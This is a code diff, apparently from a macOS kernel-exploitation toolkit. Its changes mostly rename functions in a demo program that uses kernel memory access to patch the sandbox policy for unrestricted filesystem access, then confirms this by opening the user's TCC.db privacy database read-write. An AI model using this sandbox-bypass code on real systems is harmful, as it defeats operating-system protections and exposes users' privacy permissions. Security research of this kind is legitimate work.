@@ -23,7 +23,7 @@
 
 
 int main(int argc, const char * argv[]) {
-    const char* kmem_socket = xpl_DEFAULT_KMEM_SOCKET;
+    const char* kmem_socket = XPL_DEFAULT_KMEM_SOCKET;
     
     int ch;
     while ((ch = getopt(argc, (char**)argv, "k:")) != -1) {
@@ -51,9 +51,9 @@ int main(int argc, const char * argv[]) {
     xpl_kmem_use_backend(backend);
     xpl_slider_kernel_init(xpl_kmem_remote_client_get_mh_execute_header(backend));
     
-    xpl_util_sandbox_t sandbox = xpl_util_sandbox_create();
+    xpl_sandbox_t sandbox = xpl_sandbox_create();
     xpl_log_info("patching sandbox policy to get unrestricted filesystem access");
-    xpl_util_sandbox_disable_fs_restrictions(sandbox);
+    xpl_sandbox_disable_fs_restrictions(sandbox);
     
     xpl_log_info("verifying unrestricted filesystem access");
     char* home = getenv("HOME");
@@ -62,15 +62,15 @@ int main(int argc, const char * argv[]) {
     int fd = open(tcc_db, O_RDWR);
     if (fd < 0) {
         xpl_log_error("verfication failed, failed to open TCC.db at %s, err: %s", tcc_db, strerror(errno));
-        xpl_util_sandbox_destroy(&sandbox);
+        xpl_sandbox_destroy(&sandbox);
         exit(1);
     } else {
         xpl_log_info("tcc.db open ok, verification success");
     }
     
-    getpass("\n\npress enter to restore sandbox policy\n\n");
+    getpass("\npress enter to restore sandbox policy\n");
     
     xpl_log_info("restoring sandbox policy");
-    xpl_util_sandbox_destroy(&sandbox);
+    xpl_sandbox_destroy(&sandbox);
     return 0;
 }
